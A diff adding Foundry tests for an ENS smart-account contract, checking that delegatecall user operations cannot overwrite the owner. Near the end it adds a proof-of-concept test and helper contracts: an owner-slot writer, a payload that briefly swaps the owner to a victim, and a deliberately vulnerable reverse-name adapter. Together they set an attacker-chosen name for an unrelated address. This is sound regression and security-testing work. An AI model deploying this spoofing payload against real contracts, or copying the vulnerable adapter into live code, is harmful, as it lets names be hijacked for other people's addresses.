@@ -6,13 +6,23 @@ pragma solidity ^0.8.27;
 import {IUUPSProxy} from "@ensdomains/verifiable-factory/IUUPSProxy.sol";
 import {CloneProxyBytecode} from "@ensdomains/verifiable-factory/CloneProxyBytecode.sol";
 import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
+import {DefaultReverseRegistrar} from "@ens/contracts/reverseRegistrar/DefaultReverseRegistrar.sol";
 import {EntryPoint} from "account-abstraction/core/EntryPoint.sol";
 import {IEntryPoint} from "account-abstraction/interfaces/IEntryPoint.sol";
 import {PackedUserOperation} from "account-abstraction/interfaces/PackedUserOperation.sol";
 import {TestPaymasterAcceptAll} from "account-abstraction/test/TestPaymasterAcceptAll.sol";
+import {
+    IModuleManagerEventsAndErrors
+} from "nexus/interfaces/base/IModuleManagerEventsAndErrors.sol";
 import {Nexus} from "nexus/Nexus.sol";
 import {ExecLib} from "nexus/lib/ExecLib.sol";
-import {ModeLib} from "nexus/lib/ModeLib.sol";
+import {
+    CALLTYPE_DELEGATECALL,
+    EXECTYPE_DEFAULT,
+    MODE_DEFAULT,
+    ModeLib,
+    ModePayload
+} from "nexus/lib/ModeLib.sol";
 import {Execution} from "nexus/types/DataTypes.sol";
 import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
 
@@ -28,8 +38,10 @@ import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol
 import {HCAOwnerAndSessionValidator} from "~src/hca/HCAOwnerAndSessionValidator.sol";
 import {StandaloneHCAFactory} from "~src/hca/StandaloneHCAFactory.sol";
 import {StandaloneSingleOwnerHCA} from "~src/hca/StandaloneSingleOwnerHCA.sol";
+import {IStandaloneHCAOwner} from "~src/hca/interfaces/IStandaloneHCAOwner.sol";
 import {ApprovedUpgradeGate} from "~src/registry/ApprovedUpgradeGate.sol";
 import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";
+import {PermissionedAddressSet} from "~src/utils/PermissionedAddressSet.sol";
 
 contract StandaloneSingleOwnerHCATest is Test {
     bytes4 constant ERC1271_MAGICVALUE = 0x1626ba7e;
@@ -1448,6 +1460,131 @@ contract StandaloneSingleOwnerHCATest is Test {
         assertEq(validator.validateUserOp(userOp, userOpHash), 1);
     }
 
+    function test_standaloneSingleOwnerHCA_rejectsOwnerDelegatecallUserOp() public {
+        MockExecutorModule defaultExecutor = new MockExecutorModule();
+        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
+        OwnerSlotWriter writer = new OwnerSlotWriter();
+        bytes memory delegateCallData =
+            abi.encodeCall(
+                Nexus.execute,
+                (
+                    ModeLib.encode(
+                        CALLTYPE_DELEGATECALL,
+                        EXECTYPE_DEFAULT,
+                        MODE_DEFAULT,
+                        ModePayload.wrap(0)
+                    ),
+                    abi.encodePacked(
+                        address(writer),
+                        abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
+                    )
+                )
+            );
+
+        assertEq(_validateOwnerUserOp(account, delegateCallData, 0), 1);
+        assertEq(account.owner(), owner);
+    }
+
+    function test_standaloneSingleOwnerHCA_rejectsExecuteUserOpDelegatecallIndirection() public {
+        MockExecutorModule defaultExecutor = new MockExecutorModule();
+        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
+        OwnerSlotWriter writer = new OwnerSlotWriter();
+        bytes memory innerCallData =
+            abi.encodeCall(
+                Nexus.execute,
+                (
+                    ModeLib.encode(
+                        CALLTYPE_DELEGATECALL,
+                        EXECTYPE_DEFAULT,
+                        MODE_DEFAULT,
+                        ModePayload.wrap(0)
+                    ),
+                    abi.encodePacked(
+                        address(writer),
+                        abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
+                    )
+                )
+            );
+        bytes memory wrappedCallData = abi.encodePacked(Nexus.executeUserOp.selector, innerCallData);
+
+        assertEq(_validateOwnerUserOp(account, wrappedCallData, 0), 1);
+        assertEq(account.owner(), owner);
+    }
+
+    function test_standaloneSingleOwnerHCA_handlesOwnerUserOpCallDataShapes() public {
+        MockExecutorModule defaultExecutor = new MockExecutorModule();
+        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
+
+        assertEq(_validateOwnerUserOp(account, hex"", 0), 0);
+        assertEq(_validateOwnerUserOp(account, abi.encodePacked(Nexus.executeUserOp.selector), 0), 0);
+        assertEq(
+            _validateOwnerUserOp(
+                account,
+                abi.encodePacked(Nexus.executeUserOp.selector, Nexus.executeUserOp.selector),
+                0
+            ),
+            1
+        );
+        assertEq(_validateOwnerUserOp(account, hex"deadbeef", 0), 0);
+        assertEq(_validateOwnerUserOp(account, abi.encodePacked(Nexus.execute.selector), 0), 1);
+    }
+
+    function test_standaloneSingleOwnerHCA_rejectsDefaultExecutorDelegatecall() public {
+        MockExecutorModule defaultExecutor = new MockExecutorModule();
+        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
+        OwnerSlotWriter writer = new OwnerSlotWriter();
+
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                IModuleManagerEventsAndErrors.InvalidModule.selector,
+                address(this)
+            )
+        );
+        account.executeFromExecutor(ModeLib.encodeSimpleSingle(), "");
+
+        vm.expectRevert(StandaloneSingleOwnerHCA.DelegateCallNotAllowed.selector);
+        vm.prank(address(defaultExecutor));
+        account.executeFromExecutor(
+            ModeLib.encode(
+                CALLTYPE_DELEGATECALL,
+                EXECTYPE_DEFAULT,
+                MODE_DEFAULT,
+                ModePayload.wrap(0)
+            ),
+            abi.encodePacked(
+                address(writer),
+                abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
+            )
+        );
+
+        assertEq(account.owner(), owner);
+    }
+
+    function test_standaloneSingleOwnerHCA_allowsCallModes() public {
+        MockExecutorModule defaultExecutor = new MockExecutorModule();
+        StandaloneSingleOwnerHCA account = _newOwnerValidatedAccount(defaultExecutor);
+        WalletPaidTarget target = new WalletPaidTarget();
+
+        vm.prank(address(defaultExecutor));
+        account.executeFromExecutor(
+            ModeLib.encodeSimpleSingle(),
+            ExecLib.encodeSingle(address(target), 0, abi.encodeCall(WalletPaidTarget.setValue, (7)))
+        );
+
+        assertEq(target.value(), 7);
+        assertTrue(account.supportsExecutionMode(ModeLib.encodeSimpleSingle()));
+        assertFalse(
+            account.supportsExecutionMode(
+                ModeLib.encode(
+                    CALLTYPE_DELEGATECALL,
+                    EXECTYPE_DEFAULT,
+                    MODE_DEFAULT,
+                    ModePayload.wrap(0)
+                )
+            )
+        );
+    }
+
     function test_standaloneSingleOwnerHCA_deploysAndExecutesPaymasterSponsoredOwnerUserOp() public {
         EntryPoint userOpEntryPoint = new EntryPoint();
         MockExecutorModule defaultExecutor = new MockExecutorModule();
@@ -1461,7 +1598,8 @@ contract StandaloneSingleOwnerHCATest is Test {
                 ApprovedUpgradeGate(address(0))
             );
         VerifiableFactory factory = new VerifiableFactory();
-        StandaloneHCAFactory deployer = new StandaloneHCAFactory(factory);
+        StandaloneHCAFactory deployer = new StandaloneHCAFactory(factory, address(this));
+        deployer.setImplementationApproval(address(implementation), true);
         uint256 userSalt = 4337;
         uint256 deploymentSalt = deployer.deploymentSalt(owner, address(implementation), userSalt);
         bytes32 outerSalt = keccak256(abi.encode(address(deployer), deploymentSalt));
@@ -1521,9 +1659,163 @@ contract StandaloneSingleOwnerHCATest is Test {
         assertLt(userOpEntryPoint.balanceOf(address(paymaster)), paymasterDepositBefore);
     }
 
+    function test_standaloneSingleOwnerHCA_entryPointRejectsOwnerDelegatecallUserOp() public {
+        EntryPoint userOpEntryPoint = new EntryPoint();
+        MockExecutorModule defaultExecutor = new MockExecutorModule();
+        StandaloneSingleOwnerHCA implementation =
+            new StandaloneSingleOwnerHCA(
+                address(userOpEntryPoint),
+                address(validator),
+                address(defaultExecutor),
+                "",
+                upgradeGate,
+                ApprovedUpgradeGate(address(0))
+            );
+        VerifiableFactory factory = new VerifiableFactory();
+        StandaloneHCAFactory deployer = new StandaloneHCAFactory(factory, address(this));
+        deployer.setImplementationApproval(address(implementation), true);
+        StandaloneSingleOwnerHCA account =
+            StandaloneSingleOwnerHCA(payable(deployer.deploy(owner, address(implementation), 4338)));
+        OwnerSlotWriter writer = new OwnerSlotWriter();
+
+        PackedUserOperation memory userOp;
+        userOp.sender = address(account);
+        userOp.nonce = userOpEntryPoint.getNonce(address(account), uint192(0x123457) << 168);
+        userOp.callData = abi.encodeCall(
+            Nexus.execute,
+            (
+                ModeLib.encode(
+                    CALLTYPE_DELEGATECALL,
+                    EXECTYPE_DEFAULT,
+                    MODE_DEFAULT,
+                    ModePayload.wrap(0)
+                ),
+                abi.encodePacked(
+                    address(writer),
+                    abi.encodeCall(OwnerSlotWriter.writeOwner, (makeAddr("replacement-owner")))
+                )
+            )
+        );
+        userOp.accountGasLimits = bytes32((uint256(500_000) << 128) | uint256(1_000_000));
+        userOp.preVerificationGas = 100_000;
+        userOp.gasFees = bytes32((uint256(1 gwei) << 128) | uint256(1 gwei));
+        userOp.signature = _signPersonal(ownerKey, userOpEntryPoint.getUserOpHash(userOp));
+
+        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
+        userOps[0] = userOp;
+
+        vm.deal(address(this), 1 ether);
+        userOpEntryPoint.depositTo{value: 1 ether}(address(account));
+        vm.txGasPrice(1 gwei);
+        vm.expectRevert(
+            abi.encodeWithSelector(IEntryPoint.FailedOp.selector, 0, "AA24 signature error")
+        );
+        userOpEntryPoint.handleOps(userOps, payable(makeAddr("bundler")));
+
+        assertEq(account.owner(), owner);
+        assertEq(factory.verifyContract(address(account)), address(implementation));
+    }
+
+    function test_poc_legacyStandaloneHCA_delegatecallSpoofsOwnerAndNamesVictim() public {
+        EntryPoint userOpEntryPoint = new EntryPoint();
+        LegacyDelegatecallHCA implementation =
+            new LegacyDelegatecallHCA(address(userOpEntryPoint), address(validator));
+        VerifiableFactory factory = new VerifiableFactory();
+        PermissionedAddressSet trustedHCASet = new PermissionedAddressSet(address(this));
+        trustedHCASet.approve(address(implementation), true);
+        StandaloneHCAFactory deployer = new StandaloneHCAFactory(factory, address(this));
+        deployer.setImplementationApproval(address(implementation), true);
+        LegacyDelegatecallHCA account =
+            LegacyDelegatecallHCA(payable(deployer.deploy(owner, address(implementation), 4339)));
+        DefaultReverseRegistrar defaultReverseRegistrar = new DefaultReverseRegistrar();
+        ImplementationTrustOnlyDefaultAdapter defaultAdapter =
+            new ImplementationTrustOnlyDefaultAdapter(
+                defaultReverseRegistrar,
+                factory,
+                trustedHCASet
+            );
+        defaultReverseRegistrar.setController(address(defaultAdapter), true);
+        OwnerSpoofingPayload payload = new OwnerSpoofingPayload();
+        address victim = makeAddr("unrelated-victim");
+        string memory attackerChosenName = "attacker.eth";
+
+        PackedUserOperation memory userOp;
+        userOp.sender = address(account);
+        userOp.nonce = userOpEntryPoint.getNonce(address(account), uint192(0x123458) << 168);
+        userOp.callData = abi.encodeCall(
+            Nexus.execute,
+            (
+                ModeLib.encode(
+                    CALLTYPE_DELEGATECALL,
+                    EXECTYPE_DEFAULT,
+                    MODE_DEFAULT,
+                    ModePayload.wrap(0)
+                ),
+                abi.encodePacked(
+                    address(payload),
+                    abi.encodeCall(
+                        OwnerSpoofingPayload.spoofOwnerAndSetName,
+                        (ISetNameWithHCA(address(defaultAdapter)), victim, attackerChosenName)
+                    )
+                )
+            )
+        );
+        userOp.accountGasLimits = bytes32((uint256(500_000) << 128) | uint256(1_000_000));
+        userOp.preVerificationGas = 100_000;
+        userOp.gasFees = bytes32((uint256(1 gwei) << 128) | uint256(1 gwei));
+        userOp.signature = _signPersonal(ownerKey, userOpEntryPoint.getUserOpHash(userOp));
+
+        PackedUserOperation[] memory userOps = new PackedUserOperation[](1);
+        userOps[0] = userOp;
+
+        vm.deal(address(this), 1 ether);
+        userOpEntryPoint.depositTo{value: 1 ether}(address(account));
+        vm.txGasPrice(1 gwei);
+        userOpEntryPoint.handleOps(userOps, payable(makeAddr("bundler")));
+
+        assertEq(account.owner(), owner);
+        assertEq(defaultReverseRegistrar.nameForAddr(victim), attackerChosenName);
+        assertEq(defaultReverseRegistrar.nameForAddr(owner), "");
+        assertEq(factory.verifyContract(address(account)), address(implementation));
+    }
+
     function test_validator_installHooksAreNoops() public view {
         validator.onInstall("");
         validator.onUninstall("");
+    }
+
+    function _newOwnerValidatedAccount(MockExecutorModule defaultExecutor)
+        internal
+        returns (StandaloneSingleOwnerHCA account)
+    {
+        account = new StandaloneSingleOwnerHCA(
+            entryPoint,
+            address(validator),
+            address(defaultExecutor),
+            "",
+            upgradeGate,
+            ApprovedUpgradeGate(address(0))
+        );
+        account.initializeAccount(abi.encode(owner));
+    }
+
+    function _validateOwnerUserOp(
+        StandaloneSingleOwnerHCA account,
+        bytes memory callData,
+        uint256 nonce
+    )
+        internal
+        returns (uint256 validationData)
+    {
+        bytes32 userOpHash = keccak256(abi.encode(address(account), nonce, keccak256(callData)));
+        PackedUserOperation memory userOp;
+        userOp.sender = address(account);
+        userOp.nonce = nonce;
+        userOp.callData = callData;
+        userOp.signature = _sign(ownerKey, userOpHash);
+
+        vm.prank(entryPoint);
+        return account.validateUserOp(userOp, userOpHash, 0);
     }
 
     function _newAccount() internal returns (StandaloneSingleOwnerHCA) {
@@ -2096,5 +2388,114 @@ contract WalletPaidTarget {
 
     function fail() external pure {
         revert Failed();
+    }
+}
+
+
+/// @title Owner Slot Writer
+/// @notice Writes the standalone HCA owner slot in the active execution context.
+contract OwnerSlotWriter {
+    /// @notice Replaces the address stored in slot zero.
+    /// @param replacementOwner The address to store.
+    function writeOwner(address replacementOwner) external {
+        assembly ("memory-safe") {
+            sstore(0, replacementOwner)
+        }
+    }
+}
+
+
+/// @title HCA Primary-Name Adapter Interface
+/// @notice Defines the adapter entry point used by the delegatecall exploit proof.
+interface ISetNameWithHCA {
+    /// @notice Sets an account's primary name through an HCA caller.
+    /// @param account The account whose name changes.
+    /// @param name The primary name.
+    function setNameWithHCA(address account, string calldata name) external;
+}
+
+
+/// @title Owner Spoofing Payload
+/// @notice Temporarily replaces the HCA owner while calling a vulnerable reverse adapter.
+contract OwnerSpoofingPayload {
+    /// @notice Impersonates an unrelated account for one nested adapter call.
+    /// @param adapter The vulnerable HCA-aware adapter.
+    /// @param victim The unrelated account whose reverse name changes.
+    /// @param name The reverse name selected by the HCA owner.
+    function spoofOwnerAndSetName(ISetNameWithHCA adapter, address victim, string calldata name)
+        external
+    {
+        address originalOwner;
+        assembly ("memory-safe") {
+            originalOwner := sload(0)
+            sstore(0, victim)
+        }
+        adapter.setNameWithHCA(victim, name);
+        assembly ("memory-safe") {
+            sstore(0, originalOwner)
+        }
+    }
+}
+
+
+/// @title Implementation-Trust-Only Default Adapter
+/// @notice Reproduces HCA authorization that omits deployment provenance.
+contract ImplementationTrustOnlyDefaultAdapter {
+    DefaultReverseRegistrar internal immutable REGISTRAR;
+    VerifiableFactory internal immutable VERIFIABLE_FACTORY;
+    PermissionedAddressSet internal immutable TRUSTED_HCA_SET;
+
+    /// @param registrar The reverse registrar updated by the adapter.
+    /// @param verifiableFactory The factory queried for the caller's current implementation.
+    /// @param trustedHCASet The implementation allowlist.
+    constructor(
+        DefaultReverseRegistrar registrar,
+        VerifiableFactory verifiableFactory,
+        PermissionedAddressSet trustedHCASet
+    )
+    {
+        REGISTRAR = registrar;
+        VERIFIABLE_FACTORY = verifiableFactory;
+        TRUSTED_HCA_SET = trustedHCASet;
+    }
+
+    /// @notice Sets a reverse name after performing the vulnerable runtime checks.
+    /// @param account The account whose name changes.
+    /// @param name The reverse name to set.
+    function setNameWithHCA(address account, string calldata name) external {
+        address implementation = VERIFIABLE_FACTORY.verifyContract(msg.sender);
+        require(TRUSTED_HCA_SET.includes(implementation));
+        require(IStandaloneHCAOwner(msg.sender).owner() == account);
+        REGISTRAR.setNameForAddr(account, name);
+    }
+}
+
+
+/// @title Legacy Delegatecall HCA
+/// @notice Test-only Nexus account retaining the vulnerable inherited execution paths.
+contract LegacyDelegatecallHCA is Nexus {
+    /// @notice The initialized owner.
+    address public owner;
+
+    /// @notice The fixed-session nonce reported to the validator.
+    uint96 public sessionNonce;
+
+    /// @param entryPoint_ ERC-4337 EntryPoint used by Nexus.
+    /// @param defaultValidator_ Validator used for owner UserOperations.
+    constructor(address entryPoint_, address defaultValidator_)
+        Nexus(entryPoint_, defaultValidator_, address(0), "", "")
+    {}
+
+    /// @notice Initializes the account owner.
+    /// @param initData ABI-encoded owner address.
+    function initializeAccount(bytes calldata initData) external payable override {
+        owner = abi.decode(initData, (address));
+    }
+
+    /// @notice Returns the owner and fixed-session nonce.
+    /// @return owner_ The initialized owner.
+    /// @return sessionNonce_ The current fixed-session nonce.
+    function ownerAndSessionNonce() external view returns (address owner_, uint96 sessionNonce_) {
+        return (owner, sessionNonce);
     }
 }
